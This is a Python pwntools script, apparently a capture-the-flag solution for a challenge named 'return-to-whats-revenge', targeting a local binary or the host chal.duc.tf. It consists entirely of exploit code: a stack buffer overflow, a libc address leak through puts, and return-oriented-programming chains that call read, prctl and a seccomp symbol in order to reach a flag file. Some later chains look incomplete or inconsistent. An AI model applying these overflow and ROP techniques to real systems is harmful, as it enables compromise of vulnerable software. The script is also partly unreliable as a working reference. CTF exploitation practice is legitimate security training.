from pwn import *

debug = True

if debug==True:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    pop_rax_ret = 0x43a78
    pop_rdi_ret = 0x2155f
    pop_rsi_ret = 0x23e8a
    pop_rdx_ret = 0x1b96
    pop_r10_ret = 0x130865 
    syscall = 0x13c0
    p = process('./return-to-whats-revenge')
else:
    libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
    pop_rax_ret = 0x439c8
    pop_rdi_ret = 0x2155f
    pop_rsi_ret = 0x23e6a
    pop_rdx_ret = 0x1b96
    pop_r10_ret = 0x1306b5
    syscall = 0x13c0
    p = remote('chal.duc.tf', 30006)

elf = ELF('./return-to-whats-revenge')

payload = 'A'*56+p64(0x4019db)+p64(0x403fa0)+p64(elf.sym['puts'])+p64(elf.sym['vuln'])
print p.recv()
p.sendline(payload)
puts_libc = u64(p.recv(6)+'\x00\x00')
libc.address = puts_libc - libc.sym['puts']
print hex(libc.address)
print p.recv()
payload = 'A'*56+p64(libc.address+pop_rax_ret)+p64(0)+p64(libc.address+pop_rdi_ret)+p64(0)+p64(libc.address+pop_rsi_ret)+p64(elf.bss())+p64(libc.address+pop_rdx_ret)+p64(14)+p64(libc.sym['read'])+p64(elf.sym['vuln'])
p.sendline(payload)
p.send('/chal/flag.txt')
print p.recv()
payload = 'A'*56+p64(libc.address+pop_rax_ret)+p64(157)+p64(libc.address+pop_rdi_ret)+p64(0)+p64(libc.address+pop_rsi_ret)+p64(0)+p64(libc.address+pop_rdx_ret)+p64(0)+p64(libc.address+pop_r10_ret)+p64(libc.sym['prctl'])+p64(elf.sym['vuln'])
p.sendline(payload)
print p.recv()
payload = 'A'*56+p64(libc.address+pop_rax_ret)+p64(0)+p64(libc.address+pop_rdi_ret)+p64(0)+p64(libc.address+pop_rsi_ret)+p64(0)+p64(libc.address+pop_rdx_ret)+p64(0)+p64(libc.sym['sys_seccomp'])+p64(elf.sym['vuln'])
p.sendline(payload)
print p.recv()
